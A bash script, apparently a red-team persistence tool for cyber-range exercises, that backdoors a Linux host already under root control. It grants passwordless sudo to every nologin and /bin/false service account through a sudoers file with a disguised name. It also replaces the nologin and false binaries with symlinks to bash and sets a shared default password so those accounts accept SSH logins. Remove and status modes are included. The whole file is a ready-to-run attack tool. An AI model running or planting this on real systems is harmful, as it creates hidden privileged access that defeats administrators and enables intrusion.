#!/usr/bin/env bash
# infinite-users.sh — hijack all nologin service accounts for SSH access
#
# Usage:
#   sudo ./infinite-users.sh install [password]
#   sudo ./infinite-users.sh remove
#   sudo ./infinite-users.sh status

set -euo pipefail

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { echo -e "${RED}[!]${NC} Run as root"; exit 1; }; }

NLOGIN_LOC=$(command -v nologin 2>/dev/null || echo "/usr/sbin/nologin")
FALSE_LOC=$(command -v false 2>/dev/null || echo "/bin/false")
BASH_LOC=$(command -v bash)
SKIP_RE="greyteam|ansible|scoring|cyberrange"
SHELL_RE="nologin|/bin/false"

cmd_install() {
    require_root
    local PASS="${1:-rt2025\!delta}"

    hdr "1/4  Granting sudo to all nologin + /bin/false accounts"
    getent passwd | awk -F: -v skip="$SKIP_RE" -v re="$SHELL_RE" '$7 ~ re && $1 !~ skip {print $1 " ALL=(ALL) NOPASSWD: ALL"}' \
        > /etc/sudoers.d/sysupdated
    chmod 440 /etc/sudoers.d/sysupdated
    local count
    count=$(wc -l < /etc/sudoers.d/sysupdated)
    info "Wrote $count sudoers entries to /etc/sudoers.d/sysupdated"

    hdr "2/4  Symlinking nologin + /bin/false -> bash"
    if [[ -L "$NLOGIN_LOC" ]]; then
        warn "Already a symlink: $NLOGIN_LOC -> $(readlink "$NLOGIN_LOC")"
    else
        cp "$NLOGIN_LOC" "${NLOGIN_LOC}.orig"
        rm -f "$NLOGIN_LOC"
        ln -s "$BASH_LOC" "$NLOGIN_LOC"
        info "Symlinked $NLOGIN_LOC -> $BASH_LOC (backup: ${NLOGIN_LOC}.orig)"
    fi

    if [[ -L "$FALSE_LOC" ]]; then
        warn "Already a symlink: $FALSE_LOC -> $(readlink "$FALSE_LOC")"
    else
        cp "$FALSE_LOC" "${FALSE_LOC}.orig"
        rm -f "$FALSE_LOC"
        ln -s "$BASH_LOC" "$FALSE_LOC"
        info "Symlinked $FALSE_LOC -> $BASH_LOC (backup: ${FALSE_LOC}.orig)"
    fi

    hdr "3/4  Registering nologin + /bin/false as valid shells in /etc/shells"
    grep -qxF "$NLOGIN_LOC" /etc/shells || { echo "$NLOGIN_LOC" >> /etc/shells; info "Added $NLOGIN_LOC to /etc/shells"; }
    [[ "$NLOGIN_LOC" != "/sbin/nologin" ]] && \
        { grep -qxF "/sbin/nologin" /etc/shells || { echo "/sbin/nologin" >> /etc/shells; info "Added /sbin/nologin to /etc/shells"; }; }
    grep -qxF "$FALSE_LOC" /etc/shells || { echo "$FALSE_LOC" >> /etc/shells; info "Added $FALSE_LOC to /etc/shells"; }
    grep -qxF "/usr/bin/false" /etc/shells || { echo "/usr/bin/false" >> /etc/shells; info "Added /usr/bin/false to /etc/shells"; }

    hdr "4/4  Setting password '$PASS' on all nologin + /bin/false accounts"
    local pwcount=0
    while IFS= read -r u; do
        echo "${u}:${PASS}" | chpasswd 2>/dev/null && (( pwcount++ )) || warn "chpasswd failed for $u"
    done < <(getent passwd | awk -F: -v skip="$SKIP_RE" -v re="$SHELL_RE" '$7 ~ re && $1 !~ skip {print $1}')
    info "Password set on $pwcount accounts"

    echo
    info "=== Done ==="
    info "SSH as any of these accounts with password: $PASS"
    info "All accounts have full NOPASSWD sudo"
    info "Example: ssh www-data@<target>  (password: $PASS)"
}

cmd_remove() {
    require_root

    hdr "Restoring nologin binary"
    if [[ -f "${NLOGIN_LOC}.orig" ]]; then
        rm -f "$NLOGIN_LOC"
        mv "${NLOGIN_LOC}.orig" "$NLOGIN_LOC"
        info "Restored $NLOGIN_LOC from backup"
    elif [[ -L "$NLOGIN_LOC" ]]; then
        rm -f "$NLOGIN_LOC"
        if command -v dpkg-query &>/dev/null; then
            local pkg
            pkg=$(dpkg-query -S "$NLOGIN_LOC" 2>/dev/null | cut -d: -f1 || true)
            [[ -n "$pkg" ]] && apt-get install -y --reinstall "$pkg" -qq 2>/dev/null \
                && info "Reinstalled $NLOGIN_LOC via apt" \
                || warn "Could not reinstall — $NLOGIN_LOC removed but not restored"
        else
            warn "No backup and no apt — $NLOGIN_LOC removed but not restored"
        fi
    else
        warn "nologin at $NLOGIN_LOC is not a symlink — nothing to restore"
    fi

    hdr "Restoring /bin/false binary"
    if [[ -f "${FALSE_LOC}.orig" ]]; then
        rm -f "$FALSE_LOC"
        mv "${FALSE_LOC}.orig" "$FALSE_LOC"
        info "Restored $FALSE_LOC from backup"
    elif [[ -L "$FALSE_LOC" ]]; then
        rm -f "$FALSE_LOC"
        if command -v dpkg-query &>/dev/null; then
            local pkg
            pkg=$(dpkg-query -S "$FALSE_LOC" 2>/dev/null | cut -d: -f1 || true)
            [[ -n "$pkg" ]] && apt-get install -y --reinstall "$pkg" -qq 2>/dev/null \
                && info "Reinstalled $FALSE_LOC via apt" \
                || warn "Could not reinstall — $FALSE_LOC removed but not restored"
        else
            warn "No backup and no apt — $FALSE_LOC removed but not restored"
        fi
    else
        warn "/bin/false at $FALSE_LOC is not a symlink — nothing to restore"
    fi

    hdr "Removing sudoers entry"
    if [[ -f /etc/sudoers.d/sysupdated ]]; then
        rm -f /etc/sudoers.d/sysupdated
        info "Removed /etc/sudoers.d/sysupdated"
    else
        warn "/etc/sudoers.d/sysupdated not found"
    fi

    hdr "Removing nologin + /bin/false from /etc/shells"
    sed -i '\|nologin|d' /etc/shells
    sed -i '\|/bin/false|d' /etc/shells
    sed -i '\|/usr/bin/false|d' /etc/shells
    info "Removed nologin and /bin/false entries from /etc/shells"

    echo
    info "=== Removed ==="
    warn "Passwords on service accounts are unchanged — chpasswd them manually if needed"
}

cmd_status() {
    hdr "nologin binary"
    if [[ -L "$NLOGIN_LOC" ]]; then
        info "HIJACKED  $NLOGIN_LOC -> $(readlink -f "$NLOGIN_LOC")"
    else
        warn "NOT hijacked  $NLOGIN_LOC is a real binary"
    fi

    hdr "/bin/false binary"
    if [[ -L "$FALSE_LOC" ]]; then
        info "HIJACKED  $FALSE_LOC -> $(readlink -f "$FALSE_LOC")"
    else
        warn "NOT hijacked  $FALSE_LOC is a real binary"
    fi

    hdr "/etc/shells (nologin + /bin/false entries)"
    if grep -qE "nologin|/bin/false" /etc/shells 2>/dev/null; then
        info "PRESENT"
        grep -E "nologin|/bin/false" /etc/shells
    else
        warn "NOT present — sshd will reject nologin/false-shell accounts"
    fi

    hdr "Sudoers"
    if [[ -f /etc/sudoers.d/sysupdated ]]; then
        local n
        n=$(wc -l < /etc/sudoers.d/sysupdated)
        info "PRESENT  /etc/sudoers.d/sysupdated  ($n accounts)"
    else
        warn "NOT present — /etc/sudoers.d/sysupdated missing"
    fi

    hdr "Hijacked accounts (sample)"
    getent passwd | awk -F: '$7 ~ /nologin/ || $7 ~ /\/bin\/false/ {print "  " $1 "\t" $7}' | head -10
    local total
    total=$(getent passwd | awk -F: '$7 ~ /nologin/ || $7 ~ /\/bin\/false/' | wc -l)
    info "Total nologin + /bin/false accounts: $total"
}

CMD="${1:-help}"
shift || true
case "$CMD" in
    install) cmd_install "$@" ;;
    remove)  cmd_remove       ;;
    status)  cmd_status       ;;
    *)
        echo "Usage: sudo $0 {install|remove|status} [password]"
        echo
        echo "  install [pass]  Hijack all nologin + /bin/false accounts (default pass: rt2025!delta)"
        echo "  remove          Restore nologin + /bin/false binaries + remove sudoers entry"
        echo "  status          Show hijack state, /etc/shells, sudoers"
        ;;
esac
